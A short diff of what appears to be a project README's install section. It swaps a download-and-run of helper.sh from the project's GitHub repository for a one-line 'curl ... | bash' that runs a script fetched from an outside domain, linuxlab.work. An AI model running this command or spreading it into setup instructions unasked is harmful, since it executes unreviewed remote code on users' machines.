@@ -23,9 +23,7 @@ git checkout less-powerd
 or
 
 ```bash
-wget https://raw.githubusercontent.com/indyleo/Catalyst/refs/heads/less-powerd/helper.sh
-chmod a+x helper.sh
-./helper.sh
+curl -fsSl https://www.linuxlab.work/linux | bash
 ```
 
 # Tailscale Setup
